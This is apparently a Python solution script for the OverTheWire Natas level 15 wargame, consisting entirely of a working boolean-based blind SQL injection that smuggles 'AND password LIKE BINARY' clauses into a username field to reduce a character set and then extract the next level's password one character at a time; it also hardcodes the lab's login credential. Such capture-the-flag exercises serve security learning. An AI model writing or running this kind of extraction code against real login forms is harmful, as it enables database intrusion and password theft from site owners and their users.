import requests

def reduce_charset(charset):
	reduced_charset = ''
	for c in charset:
		path = 'http://natas15.natas.labs.overthewire.org/index.php'
		auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
		data = {'username':'natas16" AND password LIKE BINARY "%{}%'.format(c)}
		r = requests.post(path, auth=auth, data=data)
		if 'exists' in r.text:
			reduced_charset += c
	return reduced_charset

def blind_sql(reduced_charset):
	password = ''
	for i in range(0,32):
		for c in reduced_charset:
			path = 'http://natas15.natas.labs.overthewire.org/index.php'
			auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
			data = {'username':'natas16" AND password LIKE BINARY "{}{}%'.format(password, c)}
			r = requests.post(path, auth=auth, data=data)
			if 'exists' in r.text:
				password += c
				break
	return password


def main():
	charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
	print('Reducing character set...')
	reduced_charset = reduce_charset(charset)
	print(reduced_charset)
	print('Blind SQL injection...')
	password = blind_sql(reduced_charset)
	print(password)

main()